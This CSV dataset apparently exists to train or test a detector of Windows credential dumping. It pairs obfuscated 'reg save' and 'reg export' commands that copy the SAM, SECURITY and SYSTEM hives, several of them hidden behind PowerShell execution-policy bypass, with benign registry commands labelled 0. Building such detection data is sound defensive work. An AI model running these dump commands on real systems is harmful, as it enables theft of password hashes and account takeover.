text,label
"rEG  SaVE  ""HkeY_locaL_maChiNE\hKeY_loCaL_maChine\SYSTem\cUrReNtcontrOLsEt\COntrOL\subKey9""  ""%TEmP%\Non_SENSItIVe.hiVe""",0
reg query,0
"staRt /b reg  compare  ""HkEY_uSerS\softwARE\mICrosOft\wINdOwS\CurREnTVERSIon""  ""hkeY_uSers\cOnTRol Panel\dESktoP_694""",0
"reg.exe   query   ""hkey_current_user\system\currentcontrolset\services""   /v version",0
c:\windows\system32\cmd.exe /k reg   export hkey_local_machine\system  \\localhost\c$\__dump\sam.bak,1
"rEG.exE  SavE  ""hkEY_loCAl_mACHINE\HKeY_LOcal_machINE\SoFtWaRE\Wow6432NodE\SUbkEY64""  ""c:\wiNdoWs\temp\soFTwaRe_dUmP.DAT""  /Y",0
"CMD /c POwErSHeLl -c ""Reg EXpoRt   HkeY_loCAl_mAChINE\SaM  \\loCalHoSt\c$\__dUMp\sAm.Bak""",1
powersHell -eXec BYpAss -W hiDden -C reg ExpoRt   hkeY_LOCaL_MAcHinE\SecuRItY   %teMp%\seC_bAckUp.dAT  /Y,1
cmD.EXe /c rEG.exe  eXPoRT  HKEy_lOcal_MAChIne\sam c:\UsErS\PUblic\ReGiSTrY_exPOrT.ReG /Y,1
"PoWersHELL -C reg.exe ResTorE ""HkEY_userS\hkeY_lOCaL_macHiNe\sYStEm\cuRreNTCONTRoLSet\cONTroL\SUBkeY92"" ""HkEy_UsERS\enVIroNmEnT_825""",0
rEg   saVE  hkLM\sam  \\LOCALhoSt\c$\__DUmP\sAm.BAk /Y,1
ReG.ExE EXPORt hkLM\SAM \\locaLHOSt\c$\__dUMp\sAm.BAK,1
c:\wINdOWS\sysTEM32\cmD.EXE /K reG.eXe  eXport   hkey_locaL_mAChiNe\SeCuRiTY %tEMp%\SeC_bACKUP.DAT,1
"Reg  uNlOad  ""Hkey_CuRREnT_USEr\SYStem\CURReNtCOntROlSet\sErViCEs\SUBkEy63""  /V LastupdATe",0
pwsh -nOPROFiLe -C ReG  SavE  HkeY_LocaL_MacHiNe\sAm C:\WINdOws\TEMp\Sam.sAVe,1
powershell -command reg.exe  export  hklm\system c:\windows\temp\sam.save /y,1
"powershell -c reg.exe delete ""hkcu\software\microsoft\windows\currentversion\subkey10"" /v path",0
"pOWeRshElL -C Reg.EXe   SAVE   ""HKey_LocAl_MAChINE\hKeY_lOCAL_MAChINe\sySTEM\curRENTcontrOlset\ContRoL""   ""d:\BACkUp\REGIstry_hIVE.dat""   /Y",0
"Reg DElETe ""HkEY_CUrreNt_USEr\SoFtwArE\GoOgLe\ChrOmE\SUbKEy97""",0
"REG  saVE  ""HkeY_LOcaL_MAcHIne\HKEy_lOcal_mAchINE\SOftwArE\policIeS\miCroSOfT\sUbkEY2""  ""C:\WINDowS\Temp\SOFTWaRe_DUmP.daT""",0
"rEg  UNLOad  ""hkEy_local_mAcHINe\SoFtWARe\poLicIeS\MYCoRp""  /V LaSTupDaTE",0
"reg.exe   add   ""hkcu\control panel\desktop""   /v version",0
"Reg.eXe  dELEte  ""HkU\contrOl PaneL\deskTOP""  /v Path",0
PoWErsheLL -cOMMAnD REG  eXpOrT HKEY_lOcal_MAchiNe\sysTEM  c:\teMp\sysTEM.HiVE,1
"REg.Exe  SAVe  ""hKey_USERs\SyStEm\CurrENTconTROLSET\seRvICEs""  ""c:\uSERS\PUBliC\CHrOME_DAtA.baK""  /y",0
powershell -exec bypass -w hidden -c reg export  hklm\system  c:\temp\system.hive /y,1
"Reg.ExE CoPy ""Hku\HKey_Local_MACHInE\SysTEM\CuRRENTcONTRolSet\ConTrOl\SuBkEy81"" ""hKu\sOFTware\poLICIes\mYCorp_212""",0
"ReG rEsToRe ""hkcu\hkeY_locAL_mACHiNE\SOFtwaRe\WOW6432NODe\subkey100"" ""HkCU\CONtRol PaNeL\DesKToP_592""",0
CMD.exe /c sTaRt /b REG   saVE Hkey_LoCAl_MACHInE\Sam  c:\tEMp\sysTeM.HiVe,1
powershell -command reg.exe   save  hkey_local_machine\sam   c:\users\public\registry_export.reg  /y,1
c:\windows\system32\cmd.exe /k reg.exe   export  hkey_local_machine\security %temp%\sec_backup.dat /y,1
"REG  ReStORe  ""HKEY_LocaL_MaCHINe\softWarE\myaPP\SETtings""  ""HKey_loCAL_mAChIne\HkEy_LoCAL_macHIne\sOFTwAre\poLiCiEs\MicROSoFt_372""",0
pwsh -noprofile -c reg.exe   save   hkey_local_machine\system %temp%\sec_backup.dat,1
"CMd /c ReG.ExE   AdD   ""HkEy_LOcAL_MaCHINe\CoNTrol paNeL\DesKtoP""   /V versiON   /T rEG_Sz   /D 1",0
"cmD /c PowErsHell -C ""REG   exPOrT   HKLM\seCuritY  c:\USeRS\PuBLiC\rEgIstrY_ExpOrt.ReG""",1
PowErsHElL -ExeC bYPass -W HIddEn -C rEG  expOrt  HkEY_LOcAl_mAcHIne\SECuRItY c:\Users\publiC\RegiStRy_eXporT.reG  /y,1
"cMD /C Reg.EXe  UnLOAd  ""Hkey_curRenT_User\soFtWaRe\clASSes\sUbKey96""  /V VerSIon",0
"starT /B REg.ExE unLOaD ""hKey_uSers\SoftWare\myAPp\seTtInGs"" /v lASTUPDaTe",0
pWSh -nopRofilE -C rEG.ExE  expOrT HkEY_lOCal_MAChinE\SAM   %Temp%\Sec_BaCkUp.DaT,1
reg.exe  save  hklm\security   \\localhost\c$\__dump\sam.bak,1
"reg.exe   restore   ""hkcu\software\microsoft\windows\currentversion\subkey49""   ""hkcu\software\microsoft\windows\currentversion_446""",0
"REg.eXe  adD  ""hKU\eNvIRoNmeNt\subkey58""  /V lastuPdATE  /t REg_DWord  /d ""1.0.0""",0
PWSH -nOPrOFile -c rEG.exe   sAVE HkLM\SaM  \\LOcALhOst\C$\__dumP\SaM.BAk  /y,1
CmD.EXe /C rEG.Exe  eXpOrt   HklM\Sam   \\lOCALhOsT\C$\__dUMP\SaM.bAK   /Y,1
"cmd /C PowerShElL -c ""rEG   sAVe hkEy_LOCal_MachinE\SaM   \.\c$ACKUp.REG""",1
powershell -exec bypass -w hidden -c reg.exe save  hklm\system c:\temp\system.hive,1
POWERShElL -coMMAnd reG   ExPORT HKeY_LOcAL_MAcHine\sYsTEm  %teMP%\sEC_BackuP.DAt,1
"sTARt /b rEG   DeLEte   ""Hkey_uSers\sOFtware\poliCiEs\mYcorp""   /F",0
C:\wiNDOWs\SYSTEm32\Cmd.exE /k reg.exe SAve  hklM\sEcurity   %tEMp%\sec_BaCKuP.DAT,1
"cmd /c reg.exe   unload   ""hkey_local_machine\hkey_local_machine\software\policies\microsoft\subkey100""   /f",0
"Reg quErY ""hku\CONTroL PanEL\DESkTop""",0
powershell -exec bypass -w hidden -c reg export  hklm\security  \.\c$ackup.reg,1
cmd.exe /c start /b reg   export   hklm\system   c:\temp\system.hive,1
"reg   restore   ""hkey_users\software\myapp\settings\subkey48""   ""hkey_users\environment_894""",0
"reg  compare  ""hkey_current_user\environment\subkey15""  ""hkey_current_user\software\myapp\settings_658""",0
"CMd /C ReG   AdD   ""hKEy_locAL_MAchIne\sYstEm\cuRrenTCoNtrOLset\servicEs\SUbkEy5""   /V LastUPdATE   /T reg_DWOrD",0
"CMD /c pOWershelL -C ""REG   EXPOrt  HKlM\seCURITy   c:\tEMp\SYstEM.hivE""",1
powershell -exec bypass -w hidden -c reg.exe export   hkey_local_machine\security c:\temp\system.hive   /y,1
"cmd /c reg.exe compare ""hkcu\environment"" ""hkcu\hkey_local_machine\system\currentcontrolset\control_621""",0
cmD.Exe /C REG  saVe   HkEY_LOCAL_macHIne\seCuriTy  \\locALHOst\c$\__dUmp\Sam.BAk  /y,1
"cmd /c powershell -c ""reg.exe save   hklm\sam c:\windows\temp\sam.save""",1
"CMD /C POwERsHEll -C ""rEG  eXporT   HkEY_lOCaL_MAchINE\SAm  \\lOCAlHoST\c$\__DUmp\SAM.baK   /y""",1
pwsh -noprofile -c reg.exe  export hklm\system   c:\temp\system.hive,1
PWsH -noproFIlE -C ReG.EXe   ExpOrt hkeY_loCaL_MaChINe\SysTem c:\UsERS\PUBLIC\ReGIStRY_ExPoRT.reg  /y,1
"pOWERsHEll -c REg.exE   SAve   ""hKcU\SoftWare\MiCroSoFT\wINdOwS\cURrENTVeRSIOn""   ""%tEmp%\Non_SENsitiVe.hivE""   /y",0
reg   save   hklm\security c:\windows\temp\sam.save  /y,1
"reg.exe  save  ""hkcu\software\myapp\settings\subkey58""  ""%temp%\non_sensitive.hive""",0
Pwsh -noProfIle -c reg   SaVE hklM\sECuRiTY  %temP%\Sec_baCkup.DAT /y,1
"REg CopY ""hKEy_cURrENt_USEr\sOFtWARE\MiCrOSOft\WINDoWs\CurrEnTvErSioN"" ""HkEY_cUrrEnT_UseR\CONtrOL PANEl\deSkTOP_440""",0
reg   eXPoRt HKLM\SYSteM \.\C$ACkUP.rEg /y,1
"cMd /c powErShElL -C ""REG exPOrT  hKey_LOCal_mACHIne\SecurITY  c:\TeMp\syStEM.HIVe""",1
"CMd /c rEg.EXE   SAVe   ""Hku\sOfTWArE\myaPp\SeTtiNGS""   ""c:\TeMP\USer_sEttINgs.REg""",0
c:\windows\system32\cmd.exe /k reg  save hklm\security \.\c$ackup.reg   /y,1
"reg.exe   save   ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey7""   ""c:\temp\user_settings.reg""",0
cmd.exe,0
reg.exe  export hkey_local_machine\sam   \\localhost\c$\__dump\sam.bak,1
POwERShELL -cOmmand rEG eXPORt   hKey_LoCAL_MAChiNE\SECurItY   c:\teMP\sySTem.HIvE,1
"reg add ""hkey_local_machine\software\myapp\settings""  /t reg_sz /d 1",0
pwSh -nOprOFiLe -C reg.EXE EXpoRT   Hklm\SeCURITY  c:\usErs\PUBlIC\reGIstry_exPORT.reg,1
powerSHell -ExEc BYpasS -W hIdDen -c REg expoRt  hkey_loCAL_MaChInE\sYsTem  C:\uSErs\pUbLIc\regiStry_ExPoRT.reg  /y,1
C:\WindowS\SysTem32\CMD.eXe /k reG.EXe  SavE   HKey_LoCAl_mAcHINE\SeCURiTy \\lOcaLhOsT\c$\__dUmP\sAM.bAk,1
C:\WINDOwS\SyStem32\CmD.exe /k rEG.EXE saVe  hklM\sam C:\WiNDOws\tEMP\sAm.SAvE   /Y,1
CmD.eXE /C reG.EXE   SavE  HkeY_locAl_mACHIne\sAm  C:\TEMp\SyStem.hIve   /y,1
"rEg.EXE  COpy  ""hkEy_cuRrEnt_uSeR\SoftwaRE\clASsES\subkEY79""  ""HKEy_CurreNT_usEr\SOfTwarE\googlE\cHRome_256""",0
"cmd /c powershell -c ""reg  save  hkey_local_machine\security   c:\temp\system.hive /y""",1
powershell -exec bypass -w hidden -c reg  export   hklm\sam   %temp%\sec_backup.dat   /y,1
pwsH -NoPRofiLE -C Reg   SavE HKEY_loCaL_MacHINE\SysTEM %TEmP%\Sec_BaCKUp.dAT   /y,1
c:\wiNDOWS\sYStEm32\cMD.EXE /K reG.eXe EXpORt  HkLM\SecuritY  \.\c$AckUp.REg /y,1
"stArT /b ReG.EXE  copY  ""HKEY_UsERs\hkEy_locAl_MaChiNE\SOfTWAre\Wow6432node""  ""HKEy_usErs\cONtrOL PanEl\desKtop_487""",0
"STarT /B ReG.eXE REsTOrE ""hkEy_UsERs\hkEY_LOCAL_MaCHINE\SOfTwARE\WOW6432nODe"" ""hKEY_UsERs\soFtwARE\mIcRosoFT\WindOWs\CuRrENtVErsIoN_686""",0
CMD.EXe /c StaRt /B REg.EXe   EXpOrt   hklm\sEcUrity  %TEmP%\SEC_bAcKup.dAT,1
"reg  delete  ""hkey_users\software\classes\subkey3""  /v lastupdate",0
"reg.exe unload ""hkey_users\software\google\chrome"" /v path",0
CMD.eXE /C StaRT /b reg.EXE   sAvE   HKeY_LocAL_maChIne\SECUrItY %TEmP%\Sec_BacKup.Dat,1
pwsh -noprofile -c reg save  hklm\sam   %temp%\sec_backup.dat,1
c:\windows\system32\cmd.exe /k reg.exe  export hkey_local_machine\system \.\c$ackup.reg   /y,1
cMD.eXE /c rEG.exE   ExPorT HKLM\systEM  C:\wiNDows\temp\Sam.sAvE  /y,1
"reg  copy  ""hku\hkey_local_machine\system\currentcontrolset\control""  ""hku\system\currentcontrolset\services_684""",0
"CMD /C Reg  COMpaRe  ""HKey_CUrRent_usER\sOFtWARe\gOoGlE\cHrome""  ""HkEY_CurrEnt_uSeR\sYStEm\CuRrENtCONtrOlSEt\SERvIcES_938""",0
powershell -exec bypass -w hidden -c reg.exe   save  hkey_local_machine\system  \.\c$ackup.reg,1
"Reg.EXe saVE ""HkEY_LoCal_MachiNE\hKEY_locAl_MachINe\systEm\CurrEntConTRoLseT\coNTROL"" ""c:\USERs\PUbLic\CHrOME_dAtA.bAK"" /Y",0
cmd.exe /c start /b reg.exe export hkey_local_machine\sam  \\localhost\c$\__dump\sam.bak,1
"Reg unLOaD ""HKU\sofTware\MyaPp\SetTinGs\sUBkEY91"" /F",0
REg   EXpORt HKey_lOCaL_maChine\SysteM   c:\teMp\sysTEM.hIVe   /y,1
powershell -command reg   save hklm\system \.\c$ackup.reg,1
cmd.exe /c start /b reg  save   hkey_local_machine\system  %temp%\sec_backup.dat   /y,1
"cMd /c rEg restoRe ""hkeY_currENt_usEr\SOFtWAre\mICROSOft\wINdOWS\cuRrEnTVERSIon\subkey32"" ""HKey_CurrenT_UsER\hKEY_LOcAL_MAcHiNE\SOftwAre\woW6432NoDe_745""",0
"cmd /c reg save ""hkey_local_machine\hkey_local_machine\system\currentcontrolset\control\subkey3"" ""d:\backup\registry_hive.dat"" /y",0
"reg.exe   compare   ""hkey_current_user\software\microsoft\windows\currentversion""   ""hkey_current_user\software\google\chrome_300""",0
"rEg.EXe RESTore ""hKeY_lOCaL_MAChiNE\sOfTWArE\miCrOSoFt\wInDOwS\CUrrEnTveRsioN\suBKey37"" ""Hkey_lOCAL_machiNE\hKEy_LocAl_MachiNe\SysteM\CUrrENtcONTrOlSET\cOnTrol_637""",0
c:\WindoWS\SYsTEM32\cMD.EXe /k rEg.ExE  SAve  Hkey_LOCaL_MAcHIne\sEcURiTY   c:\tEMP\syStEm.hIvE /y,1
c:\WINDoWS\SYsTem32\cmd.ExE /k REg.eXE  eXpOrT  hkEy_lOcAl_MAcHiNe\SysteM  \.\c$acKuP.rEg  /Y,1
"reg   query   ""hkcu\hkey_local_machine\software\policies\microsoft""",0
c:\wiNDowS\systEM32\CMD.Exe /K reG.eXE sAvE hkEy_LocaL_mAcHINE\SECUritY  %TeMp%\SEC_backuP.DaT,1
"starT /b ReG.eXE  coPY  ""hkEY_CuRRent_usER\enViROnmeNT\Subkey64""  ""HKey_cuRreNt_uSeR\coNTRol PANel\dEsktOP_849""",0
"reG.EXE quEry ""hKey_UsErS\softwArE\MIcrOsofT\windoWS\cURRentvERsIon"" /V vERSION",0
CMd.eXe /c REg.exe  sAvE   Hkey_loCaL_MAcHinE\SAm   \\LocALHOst\C$\__dUMp\SaM.Bak  /Y,1
"STArT /B REg ComPare ""hKeY_UserS\hKey_lOCaL_maCHINE\SoftwARE\pOLIciES\mICrOsOfT"" ""HKEy_USerS\SOFTWArE\gOoGLE\CHROME_752""",0
cmd.exe /c start /b reg export  hklm\system %temp%\sec_backup.dat  /y,1
c:\windows\system32\cmd.exe /k reg.exe   save  hkey_local_machine\security \.\c$ackup.reg,1
cmd.exe /c start /b reg   save   hklm\system   %temp%\sec_backup.dat   /y,1
Cmd.eXE /C rEg.exE  save  hkLm\SEcuRIty %TeMp%\Sec_BACkuP.dAT,1
cmd.exe /c start /b reg export  hklm\security %temp%\sec_backup.dat   /y,1
"Cmd /C pOWErsHelL -c ""REG  SaVE  hkLM\SECUriTY   c:\tEMp\sYsTem.HivE""",1
"CmD /C PoweRshell -c ""REG  sAvE HKEY_lOcAl_mAchInE\SeCuRitY \.\c$aCKUp.rEg /Y""",1
"ReG.exe comPARE ""HkU\SOFtWAre\GOogLE\cHromE\suBKEy93"" ""HkU\SOFTWArE\MIcrOSofT\windoWS\CURReNTvErsiOn_617""",0
POwErsheLl -coMmANd rEG  exPoRt   hklm\seCURiTY  %tEMP%\SEc_bacKup.dAT   /Y,1
reg.eXe   SAve  hKLM\sAM  C:\USerS\PUblIc\ReGiSTRY_ExPORT.rEG   /y,1
"reG quERY ""Hku\HkeY_LoCAl_macHine\SoFtWarE\polIciEs\mICROSoFT\SuBkey7""",0
powershell -exec bypass -w hidden -c reg export   hklm\system   %temp%\sec_backup.dat /y,1
reg.exe save hkey_local_machine\system c:\temp\system.hive,1
powershell -command reg save hkey_local_machine\system  c:\users\public\registry_export.reg  /y,1
powERshElL -comMAnD reg.ExE savE  hKLm\sAM  c:\USERs\pUBlIc\Registry_EXPOrT.rEg,1
reG.eXe   save  HkLM\sam  \\loCAlhoST\c$\__DumP\Sam.Bak  /y,1
"Cmd /c reg   RESTORE   ""Hkey_CURRENT_USer\HkEY_lOCAL_maCHiNe\SYstEM\curReNtcONTROlsEt\contRol\subkEy58""   ""hkEY_cURrENt_uSEr\system\CUrrEntcOnTRolsEt\ServiCEs_497""",0
"Reg   cOmPArE   ""hKu\SOfTWaRe\MYAPp\sETTinGS""   ""hKU\sofTwaRe\gOOgLE\chrOmE_502""",0
"reg.EXE  resTorE  ""hkey_lOCAl_maCHine\SoFtwaRe\goOgle\CHromE\SUBkey13""  ""HKeY_LOcAl_MAchinE\sOfTWare\clASSeS_756""",0
"StArT /B REG QueRy ""hKcU\softwArE\cLAssEs\SUBKey72"" /V paTh",0
PoweRshELL -ExEc byPass -W HIDdEn -C reG.exe   SAVE   hKEy_LOCal_maCHiNE\SYsTEM  %teMp%\SEc_baCkuP.DaT,1
powershell -exec bypass -w hidden -c reg   export   hklm\security   c:\temp\system.hive,1
"rEg  saVE  ""HkEy_current_USeR\hkEY_loCAl_macHINE\SoFTWaRE\woW6432node\SubkEy68""  ""%tEmp%\nON_SensITive.HiVE""",0
"ReG  QUERY  ""HkCU\sofTWArE\miCROsOFt\WiNDOWS\CurRENtVERSIoN\sUbKey87""  /F",0
"ReG.EXe   SaVE   ""HKey_lOcaL_machine\HkEy_LOCAL_mACHiNe\SoFTwAre\WOw6432Node""   ""C:\UseRs\puBLiC\cHRome_DaTA.bAK""   /Y",0
"POwersHELl -C ReG.exE  SAVE  ""HKeY_LOCaL_MacHInE\HKey_LocAL_mAcHINe\SystEM\CURreNTConTrOLset\COntROl\SuBkey85""  ""c:\USerS\PublIC\chROme_daTA.BaK""",0
CmD.Exe /C rEG  expoRt  HkEy_loCal_MaCHinE\SecUrIty c:\WiNDOWs\TemP\sAm.SavE  /y,1
reg.exe save,0
"rEG  comPARe  ""HkEy_LOcal_mAchinE\sOFTWArE\mYaPP\seTTiNgS""  ""hKEy_LocaL_MaCHinE\SYstEm\CUrRenTCOnTroLSeT\serViCEs_881""",0
"CmD /C Reg.Exe   coPy   ""HkeY_useRS\SOFTWaRE\GoOGLE\chrOme\suBkEY10""   ""hkEY_UsErs\environmeNt_665""",0
"STart /b ReG aDD ""hkey_locAL_mAChinE\SoFTWarE\gOogle\ChrOme"" /V PaTH",0
"reg.exe   query   ""hkey_current_user\hkey_local_machine\software\wow6432node\subkey29""   /f",0
"reg coPy ""HkEy_USERS\hKEY_lOcal_mAchINe\sysTem\CUrrEnTcoNtROlSEt\conTroL"" ""HkeY_USERS\SoftwArE\myApP\seTTiNgs_339""",0
"pOwErsHell -c REg.EXE Copy ""hKeY_uSeRs\SOFTWare\cLaSSeS\SubKEY50"" ""hKEy_USeRs\sofTWArE\micRosOfT\wiNdOws\CUrReNTVerSIoN_645""",0
"reg query ""hkey_current_user\software\google\chrome"" /v lastupdate",0
"START /b reg.eXE sAve ""hkey_lOCAl_macHIne\SySTem\cUrReNtcONTrOlseT\SErvices"" ""d:\BAcKUP\registRy_HivE.DaT"" /Y",0
powershell -command reg  save hklm\sam c:\temp\system.hive /y,1
Cmd.exe /C Reg  eXpoRT   Hkey_LocAl_MAchine\saM c:\UsERS\pUBlIc\RegIsTRy_ExpoRt.REG,1
reg.exe  export  hkey_local_machine\sam  c:\windows\temp\sam.save,1
C:\wInDOWS\systEm32\cMd.EXE /K REg   eXPORT  HKEY_loCAl_maCHINE\sAm C:\WinDOwS\TeMp\saM.SAVe,1
"CMd /c reG.exE   COMPArE   ""HKey_Users\hkeY_lOcAL_MaCHinE\sOfTWARE\poLICiES\mICrosoFT\SuBKEy53""   ""HKeY_uSerS\SOFtWare\CLAsseS_738""",0
"reg.exe delete ""hkey_users\hkey_local_machine\software\wow6432node"" /v version",0
"rEg.EXE  unloaD  ""HkEy_LOCAL_mACHiNe\sofTWArE\GOoGLE\ChrOme\sUbkey70""  /F",0
"CmD /C reg.exE UNlOaD ""HKu\sOfTWaRe\POlICIES\mYcORp"" /v VeRSiON",0
"reg.exe  copy  ""hkey_local_machine\software\policies\mycorp\subkey50""  ""hkey_local_machine\system\currentcontrolset\services_304""",0
"reg  query  ""hkcu\software\classes\subkey1""",0
cmd.exe /c reg.exe export  hkey_local_machine\sam   c:\users\public\registry_export.reg,1
"reg.exe  query  ""hku\environment\subkey2""  /v path",0
"reg restore ""hkey_users\software\google\chrome"" ""hkey_users\environment_148""",0
"CMD /c POwErSHeLL -C ""REg.exe  ExpOrt  Hklm\sEcUrity  c:\UsErS\PUbliC\reGistry_EXpoRT.rEG   /Y""",1
CMD.EXe /c sTart /b Reg.exE   ExPOrT HKey_LOcAl_mAcHine\SAM  \\LocAlhOsT\C$\__Dump\saM.BAK,1
c:\wIndoWS\sYstEm32\cmD.exe /K rEg.Exe  exPorT   hKlM\sAM  C:\temp\SystEm.HIvE   /y,1
"PoWerSheLL -c reG   qUeRY   ""hkeY_LOcAl_mAchine\SyStEM\currenTconTRoLset\SeRviCES\SUbkey32""   /V pAth",0
powershell -exec bypass -w hidden -c reg.exe  save   hklm\security c:\windows\temp\sam.save,1
"sTART /b rEg.exe  compAre  ""hKU\SYstEM\cuRRENTCoNtroLset\sErvIceS""  ""Hku\SOftWare\miCROSoFt\windoWS\CurreNtvERsIon_361""",0
"cmd /C reG   ComPARE   ""hKEy_LOcaL_mACHiNe\sOfTwARe\micRosofT\wiNDOWs\cURRENtVersIOn""   ""hkEY_LOcAl_MAchine\sOFTwaRe\poLICIes\mYcorP_623""",0
"PoWErSHEll -C REG cOMpArE ""HkEY_cUrrENt_useR\sOfTWArE\GoOgLe\ChROMe\SubkEY37"" ""hkEy_curRenT_useR\SoFTWArE\MYaPP\sETtinGs_868""",0
netsh firewall set opmode enable,0
"reg   DELEtE   ""hKeY_lOcAl_mAChine\systEm\curReNtCOntrOLsET\sERvICES\SUBKeY68""   /v paTh",0
pOwERshELl -COMMaNd reG  eXpoRT   hKLM\seCUrItY  \\loCalHoST\c$\__duMP\Sam.BAK /y,1
"start /b reg.exe   save   ""hkcu\software\microsoft\windows\currentversion""   ""c:\windows\temp\software_dump.dat""",0
cmd.Exe /C rEg  sAVE   hKlm\seCuritY c:\TEmp\sYsTEM.hivE,1
"reg.exE QUErY ""HKcu\enViROnmeNt"" /V VErSIOn",0
reg  save hkey_local_machine\security c:\temp\system.hive,1
C:\wINdOwS\SYsTEm32\cmD.exE /k REG.EXE EXpORt   hKey_LOCAl_MacHIne\sam C:\temp\sYsTEm.HIve,1
powershell -command reg  export   hklm\sam   \.\c$ackup.reg,1
"CMd /c POWeRsHEll -C ""ReG.eXe  EXPoRt HKlM\sYStem   \.\C$ACkUP.reG  /y""",1
PWSh -nOPrOFILE -c REG.ExE SAve   HKLm\sAm   c:\TeMp\SYsteM.Hive,1
POWerShelL -EXEC BYpasS -W HIDDeN -C ReG.eXe eXPORt   hKLm\SYSTEm C:\tEMP\SySTeM.hIVE,1
"STarT /b Reg.Exe saVE ""HKu\ENvironmeNt"" ""%teMp%\nON_SEnsItIvE.HIvE"" /y",0
C:\WiNdOWs\SYStem32\CmD.eXE /K REg eXport HkEy_loCaL_MachInE\secURIty   %TeMP%\seC_BAcKuP.Dat,1
c:\windows\system32\cmd.exe /k reg.exe   save   hkey_local_machine\security  \.\c$ackup.reg  /y,1
"POwErSHElL -C reg.eXe  qUery  ""hKU\CONTRol PaNEL\desKTOP\SuBkeY64""",0
"CMd /c PowERShEll -c ""REg   SAve   HkEY_loCaL_MAChine\System   C:\tEMP\sysTEm.HIVe /Y""",1
"rEg   UnloaD   ""HkEy_cURrent_useR\hkeY_LOCAl_maCHine\softWArE\wOW6432NODE""   /F",0
c:\windows\system32\cmd.exe /k reg.exe  export hkey_local_machine\security c:\temp\system.hive /y,1
"cmd /c REg.Exe  cOmPaRe  ""hkeY_UserS\SOFtwARe\miCRosoFT\WinDoWS\curReNTveRSIOn\SubKeY22""  ""hKEY_USErs\Hkey_LOcAL_MacHINE\sYSTEm\CURRenTContROlsET\ControL_500""",0
"reg.exe delete ""hkey_local_machine\hkey_local_machine\software\wow6432node"" /v version",0
powershell -exec bypass -w hidden -c reg.exe  export  hkey_local_machine\security c:\temp\system.hive /y,1
"REg.eXe QUery ""HkCu\SYSTem\CUrRentCOntrOLSET\serVIcES\suBkey84""",0
"stArt /b REg  uNLOAd  ""hkcu\enVirOnMENT""  /V LaStuPdaTE",0
reg.exe export hklm\security  c:\temp\system.hive,1
cmd.exe /c start /b reg.exe save   hkey_local_machine\security  \\localhost\c$\__dump\sam.bak,1
"rEg.ExE AdD ""hKey_locAL_mAchINe\ENViRONmeNt"" /V PAtH /t REG_Sz",0
CMD.exe /c rEG  EXport HKEY_lOCaL_macHInE\SYsTEM  c:\TEmP\sySTEm.HIVe   /y,1
c:\windows\system32\cmd.exe /k reg export   hklm\sam  \\localhost\c$\__dump\sam.bak /y,1
cmd.exe /c start /b reg.exe export hklm\security %temp%\sec_backup.dat  /y,1
PoWErsheLl -CoMMAND REg.EXE   expoRt HkeY_loCAL_mACHINe\sam %tEmp%\SeC_backuP.dAt,1
"cMD /C powErsHeLl -C ""REG.EXe   SaVe   hKlm\SECurity C:\Temp\SySteM.HivE""",1
"reg.exe save ""hkey_local_machine\hkey_local_machine\software\policies\microsoft"" ""%temp%\non_sensitive.hive""",0
Reg expoRT  hkeY_lOCAL_maChine\SysteM c:\wINDOWs\tEmP\SAM.SaVE,1
c:\WInDoWs\SYSteM32\CMd.ExE /K Reg   Export   HKLM\SySTEm C:\UseRS\puBLIC\regiStrY_ExPoRt.rEG  /y,1
"Cmd /C reG.Exe deLETE ""hkey_UsERs\hKEY_loCaL_MachiNE\SofTwArE\poLIcIEs\mIcRoSOFT"" /V LaSTUpDAte",0
CMD.exE /c reG.Exe  sAve hKlm\saM   c:\USErS\PubLIC\REgiSTRy_eXPORT.Reg /Y,1
"start /b reg.exe  restore  ""hkey_local_machine\software\google\chrome""  ""hkey_local_machine\control panel\desktop_123""",0
pwsh -noprofile -c reg  save hklm\sam  \\localhost\c$\__dump\sam.bak,1
pOwerSheLL -commanD REg  save   HkLm\sYSTEm  C:\wiNDOwS\tEMp\sAM.SAVE   /y,1
poWERSHElL -eXEC bYpAss -W hIdDEn -C REG exPoRT  HKey_LocAl_MAcHine\SecUrITY   \\lOCalhOst\c$\__duMp\saM.BaK,1
"start /b reg copy ""hkcu\hkey_local_machine\software\policies\microsoft\subkey98"" ""hkcu\software\myapp\settings_120""",0
"REG.EXe  sAvE  ""hkEY_CuRREnT_USer\cOntroL pANel\DEsktoP\SUbkeY20""  ""c:\wINDOWS\tEMp\soFtWArE_DUMp.Dat""  /y",0
pOWersHEll -COmmANd reg.EXe  sAVe  hKLM\sEcURITY  %TEmp%\SEC_BackUP.Dat   /y,1
"REg unLoAD ""hKEY_locAL_MacHiNe\softWArE\POlicIES\MYcORP"" /v lAStuPdAtE",0
